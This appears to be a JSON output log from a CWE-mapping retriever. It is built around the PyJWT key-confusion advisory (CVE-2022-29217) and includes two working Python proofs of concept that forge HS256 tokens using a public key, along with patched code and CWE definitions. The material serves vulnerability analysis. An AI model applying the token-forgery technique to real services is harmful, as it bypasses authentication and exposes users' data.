{
  "retriever": "sparse",
  "query": "## Vulnerability Description\nPyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding.\n\n### Vulnerability Description Key Phrases\n- **rootcause:** **default algorithms setting in PyJWT**\n- **vector:** choose the used signing algorithm\n- **attacker:** attacker\n- **product:** PyJWT\n- **version:** prior to v2.4.0\n\n## CVE Reference Links Content Summary\n```\n{\n  \"vulnerability\": {\n    \"root_cause\": \"The PyJWT library incorrectly handles public keys when used with HMAC algorithms. It fails to properly validate that a key intended for asymmetric encryption (like EdDSA or ECDSA with formats such as PEM or OpenSSH) is not misused as a secret for HMAC (symmetric) algorithms.\",\n    \"weaknesses\": [\n      \"Key confusion vulnerability due to insufficient validation of key types.\"\n    ],\n    \"impact\": \"An attacker can forge JWT tokens by using a public key as a secret key for HMAC algorithms, bypassing signature verification. This leads to unauthorized access or manipulation of data if the JWT is used for authentication or authorization purposes. This is because the attacker can sign the token with the public key, and the receiver would use the same key to verify.\",\n    \"attack_vectors\": \"An attacker can exploit this by crafting a JWT with an HMAC algorithm (e.g., HS256) and signing it with a public key (in PEM or OpenSSH format). The vulnerable server, when configured to use `jwt.algorithms.get_default_algorithms()` and processing this token, will incorrectly validate it.\",\n    \"required_attacker_capabilities\": \"The attacker needs to be able to submit a crafted JWT to the vulnerable system. They also need to know a public key that the server is configured to use, or can otherwise force the server to use. \"\n  },\n  \"technical_details\": {\n    \"description\": \"PyJWT supports multiple JWT signing algorithms. It requires the application to specify the supported algorithms.  If the application uses `jwt.algorithms.get_default_algorithms()` it will enable all algorithms. The library attempts to prevent certain attacks, for example: the 'none' algorithm requires an empty key; and HMAC algorithms will reject keys that look like public keys (e.g. starting with 'ssh-rsa').  However, the library does not properly enforce this for  `ed25519`, allowing public keys to be used with HMAC algorithms. \\n\\nThis means that if an application receives a token using an HMAC algorithm (e.g. HS256) and it uses a public key as the key, the token would validate.\",\n    \"poc\": [\n      \"```python\\nimport jwt\\nfrom cryptography.hazmat.primitives import serialization\\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\\n\\n# Generate ed25519 private key\\nprivate_key = ed25519.Ed25519PrivateKey.generate()\\n\\n# Get private key bytes as they would be stored in a file\\npriv_key_bytes =\\nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8,\\nencryption_algorithm=serialization.NoEncryption())\\n\\n# Get public key bytes as they would be stored in a file\\npub_key_bytes =\\nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\\n\\n# Making a good jwt token that should work by signing it with the\\nprivate key\\nencoded_good = jwt.encode({\\\"test\\\": 1234}, priv_key_bytes, algorithm=\\\"EdDSA\\\")\\n\\n# Using HMAC with the public key to trick the receiver to think that the\\npublic key is a HMAC secret\\nencoded_bad = jwt.encode({\\\"test\\\": 1234}, pub_key_bytes, algorithm=\\\"HS256\\\")\\n\\n# Both of the jwt tokens are validated as valid\\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes,\\nalgorithms=jwt.algorithms.get_default_algorithms())\\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes,\\nalgorithms=jwt.algorithms.get_default_algorithms())\\n\\nif decoded_good == decoded_bad:\\n  print(\\\"POC Successfull\\\")\\n```\",\n      \"```python\\nimport jwt\\n\\n#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem\\n#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem\\n#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub\\n\\npriv_key_bytes = b\\\"\\\"\\\"-----BEGIN EC PRIVATE KEY-----\\nMHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49\\nAwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk\\nAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\\n-----END EC PRIVATE KEY-----\\\"\\\"\\\"\\n\\npub_key_bytes = b\\\"\\\"\\\"-----BEGIN PUBLIC KEY-----\\nMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL\\nZr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==\\n-----END PUBLIC KEY-----\\\"\\\"\\\"\\n\\nssh_key_bytes = b\\\"\\\"\\\"ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=\\\"\\\"\\\"\\n\\n# Making a good jwt token that should work by signing it with the private key\\nencoded_good = jwt.encode({\\\"test\\\": 1234}, priv_key_bytes, algorithm=\\\"ES256\\\")\\n\\n# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret\\nencoded_bad = jwt.encode({\\\"test\\\": 1234}, ssh_key_bytes, algorithm=\\\"HS256\\\")\\n\\n# Both of the jwt tokens are validated as valid\\ndecoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\\ndecoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())\\n\\nif decoded_good == decoded_bad:\\n    print(\\\"POC Successfull\\\")\\nelse:\\n    print(\\\"POC Failed\\\")\\n```\"\n    ],\n    \"affected_code\": \"The vulnerability is in how the `prepare_key` function within the `OKPAlgorithm` class in `jwt/algorithms.py` handles key formats. It incorrectly loads public keys from PEM/OpenSSH formats and allows them to be used with HMAC algorithms due to insufficient type checking. The relevant part of the code is:\\n```python\\n        if isinstance(\\n            key,\\n            (Ed25519PrivateKey, Ed25519PublicKey, Ed448PrivateKey, Ed448PublicKey),\\n        ):\\n            return key\\n\\n        if isinstance(key, (bytes, str)):\\n            if isinstance(key, str):\\n                key = key.encode(\\\"utf-8\\\")\\n            str_key = key.decode(\\\"utf-8\\\")\\n\\n            if \\\"-----BEGIN PUBLIC\\\" in str_key:\\n                return load_pem_public_key(key)\\n            if \\\"-----BEGIN PRIVATE\\\" in str_key:\\n                return load_pem_private_key(key, password=None)\\n            if str_key[0:4] == \\\"ssh-\\\":\\n                return load_ssh_public_key(key)\\n```\",\n    \"patched_code\": \"The fix involves adding an explicit check to prevent public keys from being used with HMAC algorithms. It ensures that only symmetric keys (or an empty key for the 'none' algorithm) can be used with HMAC.\\nThis is done by modifying the `prepare_key` function in the `HMACAlgorithm` class to check if the key is a PEM or SSH key format and raise an `InvalidKeyError`.\\n```python\\n    def prepare_key(self, key):\\n        key = force_bytes(key)\\n\\n        if is_pem_format(key) or is_ssh_key(key):\\n            raise InvalidKeyError(\\n                \\\"The specified key is an asymmetric key or x509 certificate and\\\"\\n                \\\" should not be used as an HMAC secret.\\\"\\n            )\\n\\n        return key\\n```\"\n  },\n  \"remediation\": {\n    \"patches\": \"Upgrade to `pyjwt` version 2.4.0 or later.\",\n    \"workarounds\": \"Always explicitly specify the allowed algorithms when decoding JWTs instead of using `jwt.algorithms.get_default_algorithms()`. For example, if you know the algorithm to be used is 'EdDSA', specify algorithms=['EdDSA'] in the `jwt.decode` function. This will prevent the library from trying other algorithms.\"\n  },\n    \"cvss\": {\n        \"score\": 7.4,\n        \"vector\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\",\n      \"metrics\": {\n        \"attack_vector\": \"Network\",\n        \"attack_complexity\": \"High\",\n        \"privileges_required\": \"None\",\n        \"user_interaction\": \"None\",\n        \"scope\": \"Unchanged\",\n        \"confidentiality\": \"High\",\n        \"integrity\": \"High\",\n        \"availability\": \"None\"\n      }\n    },\n  \"references\": [\n    \"https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24\",\n    \"https://nvd.nist.gov/vuln/detail/CVE-2022-29217\",\n    \"https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc\",\n        \"https://github.com/jpadilla/pyjwt/releases/tag/2.4.0\",\n    \"https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2022-202.yaml\",\n        \"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5PK7IQCBVNLYJEFTPHBBPFP72H4WUFNX\",\n    \"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6HIYEYZRQEP6QTHT3EHH3RGFYJIHIMAO\"\n  ]\n}\n```\n\n## Retriever Results\n\n### Top Combined Results\n\n| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |\n|------|--------|------|-------------|-------|------------|-------------------|\n| 1 | 327 | Use of a Broken or Risky Cryptographic Algorithm | Class | Allowed-with-Review | sparse | 0.952 |\n| 2 | 834 | Excessive Iteration | Class | Discouraged | sparse | 0.683 |\n| 3 | 347 | Improper Verification of Cryptographic Signature | Base | Allowed | sparse | 0.682 |\n| 4 | 1240 | Use of a Cryptographic Primitive with a Risky Implementation | Base | Allowed | sparse | 0.651 |\n| 5 | 345 | Insufficient Verification of Data Authenticity | Class | Discouraged | sparse | 0.631 |\n| 6 | 757 | Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade') | Base | Allowed | dense | 0.405 |\n| 7 | 208 | Observable Timing Discrepancy | Base | Allowed | graph | 0.002 |\n| 8 | 338 | Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG) | Base | Allowed | sparse | 0.624 |\n| 9 | 287 | Improper Authentication | Class | Discouraged | sparse | 0.599 |\n| 10 | 326 | Inadequate Encryption Strength | Class | Allowed-with-Review | sparse | 0.591 |\n\n\n\n# Complete CWE Specifications\n\n\n## CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n**Abstraction:** Class\n**Status:** Draft\n\n### Description\nThe product uses a broken or risky cryptographic algorithm or protocol.\n\n### Extended Description\n\n\nCryptographic algorithms are the methods by which data is scrambled to prevent observation or influence by unauthorized actors. Insecure cryptography can be exploited to expose sensitive information, modify data in unexpected ways, spoof identities of other users or devices, or other impacts.\n\n\nIt is very difficult to produce a secure algorithm, and even high-profile algorithms by accomplished cryptographic experts have been broken. Well-known techniques exist to break or weaken various kinds of cryptography. Accordingly, there are a small number of well-understood and heavily studied algorithms that should be used by most products. Using a non-standard or known-insecure algorithm is dangerous because a determined adversary may be able to break the algorithm and compromise whatever data has been protected.\n\n\nSince the state of cryptography advances so rapidly, it is common for an algorithm to be considered \"unsafe\" even if it was once thought to be strong. This can happen when new attacks are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.\n\n\nFor a number of reasons, this weakness is even more challenging to manage with hardware deployment of cryptographic algorithms as opposed to software implementation. First, if a flaw is discovered with hardware-implemented cryptography, the flaw cannot be fixed in most cases without a recall of the product, because hardware is not easily replaceable like software. Second, because the hardware product is expected to work for years, the adversary's computing power will only increase over time.\n\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-693\nPeerOf -> CWE-311\n\n### Mapping Guidance\n**Usage:** Allowed-with-Review\n**Rationale:** This CWE entry is a Class and might have Base-level children that would be more appropriate\n**Comments:** Examine children of this entry to see if there is a better fit\n**Reasons:**\n- Abstraction\n\n\n### Additional Notes\n**[Maintenance]** Since CWE 4.4, various cryptography-related entries, including CWE-327 and CWE-1240, have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.\n\n**[Maintenance]** The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the \"Mapping CWE to 62443\" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.\n\n\n\n### Observed Examples\n- **CVE-2022-30273:** SCADA-based protocol supports a legacy encryption mode that uses Tiny Encryption Algorithm (TEA) in ECB mode, which leaks patterns in messages and cannot protect integrity\n- **CVE-2022-30320:** Programmable Logic Controller (PLC) uses a protocol with a cryptographically insecure hashing algorithm for passwords.\n- **CVE-2008-3775:** Product uses \"ROT-25\" to obfuscate the password in the registry.\n\n\n\n\n## CWE-834: Excessive Iteration\n**Abstraction:** Class\n**Status:** Incomplete\n\n### Description\nThe product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed.\n\n### Extended Description\nIf the iteration can be influenced by an attacker, this weakness could allow attackers to consume excessive resources such as CPU or memory. In many cases, a loop does not need to be infinite in order to cause enough resource consumption to adversely affect the product or its host system; it depends on the amount of resources consumed per iteration.\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-691\n\n### Mapping Guidance\n**Usage:** Discouraged\n**Rationale:** This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate\n**Comments:** Examine children of this entry to see if there is a better fit\n**Reasons:**\n- Abstraction\n\n\n\n### Observed Examples\n- **CVE-2011-1027:** Chain: off-by-one error (CWE-193) leads to infinite loop (CWE-835) using invalid hex-encoded characters.\n- **CVE-2006-6499:** Chain: web browser crashes due to infinite loop - \"bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]\"\n\n\n\n\n## CWE-347: Improper Verification of Cryptographic Signature\n**Abstraction:** Base\n**Status:** Draft\n\n### Description\nThe product does not verify, or incorrectly verifies, the cryptographic signature for data.\n\n### Extended Description\nNot provided\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-345\nChildOf -> CWE-345\n\n### Mapping Guidance\n**Usage:** Allowed\n**Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n**Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.\n**Reasons:**\n- Acceptable-Use\n\n\n\n### Observed Examples\n- **CVE-2002-1796:** Does not properly verify signatures for \"trusted\" entities.\n- **CVE-2005-2181:** Insufficient verification allows spoofing.\n- **CVE-2005-2182:** Insufficient verification allows spoofing.\n\n\n\n\n## CWE-1240: Use of a Cryptographic Primitive with a Risky Implementation\n**Abstraction:** Base\n**Status:** Draft\n\n### Description\nTo fulfill the need for a cryptographic primitive, the product implements a cryptographic algorithm using a non-standard, unproven, or disallowed/non-compliant cryptographic implementation.\n\n### Extended Description\n\n\nCryptographic protocols and systems depend on cryptographic primitives (and associated algorithms) as their basic building blocks. Some common examples of primitives are digital signatures, one-way hash functions, ciphers, and public key cryptography; however, the notion of \"primitive\" can vary depending on point of view. See \"Terminology Notes\" for further explanation of some concepts.\n\n\nCryptographic primitives are defined to accomplish one very specific task in a precisely defined and mathematically reliable fashion. For example, suppose that for a specific cryptographic primitive (such as an encryption routine), the consensus is that the primitive can only be broken after trying out N different inputs (where the larger the value of N, the stronger the cryptography). For an encryption scheme like AES-256, one would expect N to be so large as to be infeasible to execute in a reasonable amount of time.\n\n\nIf a vulnerability is ever found that shows that one can break a cryptographic primitive in significantly less than the expected number of attempts, then that primitive is considered weakened (or sometimes in extreme cases, colloquially it is \"broken\"). As a result, anything using this cryptographic primitive would now be considered insecure or risky. Thus, even breaking or weakening a seemingly small cryptographic primitive has the potential to render the whole system vulnerable, due to its reliance on the primitive. A historical example can be found in TLS when using DES. One would colloquially call DES the cryptographic primitive for transport encryption in this version of TLS. In the past, DES was considered strong, because no weaknesses were found in it; importantly, DES has a key length of 56 bits. Trying N=2^56 keys was considered impractical for most actors. Unfortunately, attacking a system with 56-bit keys is now practical via brute force, which makes defeating DES encryption practical. It is now practical for an adversary to read any information sent under this version of TLS and use this information to attack the system. As a result, it can be claimed that this use of TLS is weak, and that any system depending on TLS with DES could potentially render the entire system vulnerable to attack.\n\n\nCryptographic primitives and associated algorithms are only considered safe after extensive research and review from experienced cryptographers from academia, industry, and government entities looking for any possible flaws. Furthermore, cryptographic primitives and associated algorithms are frequently reevaluated for safety when new mathematical and attack techniques are discovered. As a result and over time, even well-known cryptographic primitives can lose their compliance status with the discovery of novel attacks that might either defeat the algorithm or reduce its robustness significantly.\n\n\nIf ad-hoc cryptographic primitives are implemented, it is almost certain that the implementation will be vulnerable to attacks that are well understood by cryptographers, resulting in the exposure of sensitive information and other consequences.\n\n\nThis weakness is even more difficult to manage for hardware-implemented deployment of cryptographic algorithms. First, because hardware is not patchable as easily as software, any flaw discovered after release and production typically cannot be fixed without a recall of the product. Secondly, the hardware product is often expected to work for years, during which time computation power available to the attacker only increases. Therefore, for hardware implementations of cryptographic primitives, it is absolutely essential that only strong, proven cryptographic primitives are used.\n\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-327\n\n### Mapping Guidance\n**Usage:** Allowed\n**Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n**Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.\n**Reasons:**\n- Acceptable-Use\n\n\n### Additional Notes\n**[Terminology]** \n\n Terminology for cryptography varies widely, from informal and colloquial to mathematically-defined, with different precision and formalism depending on whether the stakeholder is a developer, cryptologist, etc. Yet there is a need for CWE to be self-consistent while remaining understandable and acceptable to multiple audiences.\n\n\nAs of CWE 4.6, CWE terminology around \"primitives\" and \"algorithms\" is emerging as shown by the following example, subject to future consultation and agreement within the CWE and cryptography communities. Suppose one wishes to send encrypted data using a CLI tool such as OpenSSL. One might choose to use AES with a 256-bit key and require tamper protection (GCM mode, for instance). For compatibility's sake, one might also choose the ciphertext to be formatted to the PKCS#5 standard. In this case, the \"cryptographic system\" would be AES-256-GCM with PKCS#5 formatting. The \"cryptographic function\" would be AES-256 in the GCM mode of operation, and the \"algorithm\" would be AES. Colloquially, one would say that AES (and sometimes AES-256) is the \"cryptographic primitive,\" because it is the algorithm that realizes the concept of symmetric encryption (without modes of operation or other protocol related modifications). In practice, developers and architects typically refer to base cryptographic algorithms (AES, SHA, etc.) as cryptographic primitives.\n\n\n**[Maintenance]** Since CWE 4.4, various cryptography-related entries, including CWE-327 and CWE-1240, have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.\n\n\n\n### Observed Examples\n- **CVE-2020-4778:** software uses MD5, which is less safe than the default SHA-256 used by related products\n- **CVE-2005-2946:** Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates.\n- **CVE-2019-3907:** identity card uses MD5 hash of a salt and password\n\n\n\n\n## CWE-345: Insufficient Verification of Data Authenticity\n**Abstraction:** Class\n**Status:** Draft\n\n### Description\nThe product does not sufficiently verify the origin or authenticity of data, in a way that causes it to accept invalid data.\n\n### Extended Description\nNot provided\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-693\n\n### Mapping Guidance\n**Usage:** Discouraged\n**Rationale:** This CWE entry is a level-1 Class (i.e., a child of a Pillar). It might have lower-level children that would be more appropriate\n**Comments:** Examine children of this entry to see if there is a better fit\n**Reasons:**\n- Abstraction\n\n\n### Additional Notes\n**[Relationship]** \"origin validation\" could fall under this.\n\n**[Maintenance]** The specific ways in which the origin is not properly identified should be laid out as separate weaknesses. In some sense, this is more like a category.\n\n\n\n### Observed Examples\n- **CVE-2022-30260:** Distributed Control System (DCS) does not sign firmware images and only relies on insecure checksums for integrity checks\n- **CVE-2022-30267:** Distributed Control System (DCS) does not sign firmware images and only relies on insecure checksums for integrity checks\n- **CVE-2022-30272:** Remote Terminal Unit (RTU) does not use signatures for firmware images and relies on insecure checksums\n\n\n\n\n## CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n**Abstraction:** Base\n**Status:** Incomplete\n\n### Description\nA protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.\n\n### Extended Description\nWhen a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the product by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-693\n\n### Mapping Guidance\n**Usage:** Allowed\n**Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n**Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.\n**Reasons:**\n- Acceptable-Use\n\n\n### Additional Notes\n**[Relationship]** This is related to CWE-300, although not all downgrade attacks necessarily require an entity that redirects or interferes with the network. See examples.\n\n\n\n### Observed Examples\n- **CVE-2006-4302:** Attacker can select an older version of the software to exploit its vulnerabilities.\n- **CVE-2006-4407:** Improper prioritization of encryption ciphers during negotiation leads to use of a weaker cipher.\n- **CVE-2005-2969:** chain: SSL/TLS implementation disables a verification step (CWE-325) that enables a downgrade attack to a weaker protocol.\n\n\n\n\n## CWE-208: Observable Timing Discrepancy\n**Abstraction:** Base\n**Status:** Incomplete\n\n### Description\nTwo separate operations in a product require different amounts of time to complete, in a way that is observable to an actor and reveals security-relevant information about the state of the product, such as whether a particular operation was successful or not.\n\n### Extended Description\nIn security-relevant contexts, even small variations in timing can be exploited by attackers to indirectly infer certain details about the product's internal operations. For example, in some cryptographic algorithms, attackers can use timing differences to infer certain properties about a private key, making the key easier to guess. Timing discrepancies effectively form a timing side channel.\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-203\nCanPrecede -> CWE-385\nCanPrecede -> CWE-327\n\n### Mapping Guidance\n**Usage:** Allowed\n**Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n**Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.\n**Reasons:**\n- Acceptable-Use\n\n\n### Additional Notes\n**[Relationship]** Often primary in cryptographic applications and algorithms.\n\n**[Maintenance]** CWE 4.16 removed a demonstrative example for a hardware module because it was inaccurate and unable to be adapted. The CWE team is developing an alternative.\n\n\n\n### Observed Examples\n- **CVE-2019-10071:** Java-oriented framework compares HMAC signatures using String.equals() instead of a constant-time algorithm, causing timing discrepancies\n- **CVE-2019-10482:** Smartphone OS uses comparison functions that are not in constant time, allowing side channels\n- **CVE-2014-0984:** Password-checking function in router terminates validation of a password entry when it encounters the first incorrect character, which allows remote attackers to obtain passwords via a brute-force attack that relies on timing differences in responses to incorrect password guesses, aka a timing side-channel attack.\n\n\n\n\n## CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)\n**Abstraction:** Base\n**Status:** Draft\n\n### Description\nThe product uses a Pseudo-Random Number Generator (PRNG) in a security context, but the PRNG's algorithm is not cryptographically strong.\n\n### Extended Description\n\n\nWhen a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks.\n\n\nOften a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a mediocre source of randomness is sufficient or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography.\n\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-330\nChildOf -> CWE-330\n\n### Mapping Guidance\n**Usage:** Allowed\n**Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.\n**Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.\n**Reasons:**\n- Acceptable-Use\n\n\n### Additional Notes\n**[Maintenance]** As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, \"randomness\" is used heavily. However, within cryptography, \"entropy\" is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios.\n\n\n\n### Observed Examples\n- **CVE-2021-3692:** PHP framework uses mt_rand() function (Marsenne Twister) when generating tokens\n- **CVE-2009-3278:** Crypto product uses rand() library function to generate a recovery key, making it easier to conduct brute force attacks.\n- **CVE-2009-3238:** Random number generator can repeatedly generate the same value.\n\n\n\n\n## CWE-287: Improper Authentication\n**Abstraction:** Class\n**Status:** Draft\n\n### Description\nWhen an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.\n\n### Extended Description\nNot provided\n\n### Alternative Terms\nauthentification: An alternate term is \"authentification\", which appears to be most commonly used by people from non-English-speaking countries.\nAuthN: \"AuthN\" is typically used as an abbreviation of \"authentication\" within the web application security community. It is also distinct from \"AuthZ,\" which is an abbreviation of \"authorization.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization.\nAuthC: \"AuthC\" is used as an abbreviation of \"authentication,\" but it appears to used less frequently than \"AuthN.\"\n\n### Relationships\nChildOf -> CWE-284\nChildOf -> CWE-284\n\n### Mapping Guidance\n**Usage:** Discouraged\n**Rationale:** This CWE entry might be misused when lower-level CWE entries are likely to be applicable. It is a level-1 Class (i.e., a child of a Pillar).\n**Comments:** Consider children or descendants, beginning with CWE-1390: Weak Authentication or CWE-306: Missing Authentication for Critical Function.\n**Reasons:**\n- Frequent Misuse\n**Suggested Alternatives:**\n- CWE-1390: Weak Authentication\n- CWE-306: Missing Authentication for Critical Function\n\n\n### Additional Notes\n**[Relationship]** This can be resultant from SQL injection vulnerabilities and other issues.\n\n**[Maintenance]** The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the \"Mapping CWE to 62443\" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.\n\n\n\n### Observed Examples\n- **CVE-2022-35248:** Chat application skips validation when Central Authentication Service (CAS) is enabled, effectively removing the second factor from two-factor authentication\n- **CVE-2022-36436:** Python-based authentication proxy does not enforce password authentication during the initial handshake, allowing the client to bypass authentication by specifying a 'None' authentication type.\n- **CVE-2022-30034:** Chain: Web UI for a Python RPC framework does not use regex anchors to validate user login emails (CWE-777), potentially allowing bypass of OAuth (CWE-1390).\n\n\n\n\n## CWE-326: Inadequate Encryption Strength\n**Abstraction:** Class\n**Status:** Draft\n\n### Description\nThe product stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.\n\n### Extended Description\nA weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.\n\n### Alternative Terms\nNone\n\n### Relationships\nChildOf -> CWE-693\n\n### Mapping Guidance\n**Usage:** Allowed-with-Review\n**Rationale:** This CWE entry is a Class and might have Base-level children that would be more appropriate\n**Comments:** Examine children of this entry to see if there is a better fit\n**Reasons:**\n- Abstraction\n\n\n\n### Observed Examples\n- **CVE-2001-1546:** Weak encryption\n- **CVE-2004-2172:** Weak encryption (chosen plaintext attack)\n- **CVE-2002-1682:** Weak encryption\n\n",
  "keyphrases": {},
  "timestamp": "2025-03-30 14:15:11",
  "cve_id": "unknown",
  "result_count": 5,
  "results": [
    {
      "cwe_id": "1240",
      "name": "Use of a Cryptographic Primitive with a Risky Implementation",
      "score": 9594.772515486211,
      "search_source": "base_query"
    },
    {
      "cwe_id": "327",
      "name": "Use of a Broken or Risky Cryptographic Algorithm",
      "score": 8595.176651578511,
      "search_source": "base_query"
    },
    {
      "cwe_id": "347",
      "name": "Improper Verification of Cryptographic Signature",
      "score": 7798.916260315731,
      "search_source": "base_query"
    },
    {
      "cwe_id": "338",
      "name": "Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)",
      "score": 7491.303114025654,
      "search_source": "base_query"
    },
    {
      "cwe_id": "203",
      "name": "Observable Discrepancy",
      "score": 7445.281767613724,
      "search_source": "base_query"
    }
  ]
}